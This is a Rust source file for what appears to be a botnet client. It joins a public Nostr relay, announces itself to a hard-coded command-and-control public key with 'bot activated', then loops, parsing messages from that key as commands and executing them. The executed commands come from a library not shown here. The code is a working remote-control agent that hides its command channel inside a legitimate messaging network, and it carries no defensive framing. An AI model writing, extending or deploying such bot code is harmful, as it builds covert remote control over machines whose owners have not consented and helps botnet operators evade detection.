use std::{
    net::{Ipv4Addr, SocketAddr, SocketAddrV4},
    time::Duration,
};

use bns_lib::{
    CNC_PUB_KEY,
    commands::Commands,
    session::{Session, SessionProps},
};
use nostr_sdk::prelude::*;

const RELAYS: [&str; 1] = ["wss://relay.primal.net"];

pub async fn run() -> Result<()> {
    let session = Session::create(SessionProps {
        name: "bot2".to_string(),
        display_name: "bot2".to_string(),
        private_key: None,
        relays: RELAYS.to_vec().iter().map(|&s| s.to_string()).collect(),
    })
    .await?;

    // announce bot presence
    session
        .send_msg("bot activated", PublicKey::parse(CNC_PUB_KEY).unwrap())
        .await?;

    let public_key = PublicKey::parse(CNC_PUB_KEY).unwrap();
    let mut stream = session.receive_msgs(public_key).await?;

    loop {
        // What the hell men, new events are not received by subscription!?
        if let Some(msg) = stream.next().await {
            println!("RECEIVED MESSAGE: {}", msg);
            if let Some(command) = Commands::parse(msg.as_str()) {
                command.execute(&session).await?;
                println!("Handled command");
            }
        }
    }
}

#[tokio::main]
async fn main() {

    match run().await {
        Err(e) => {
            println!("Got an error {}", e.to_string())
        }
        _ => println!("Succeeded"),
    }
}
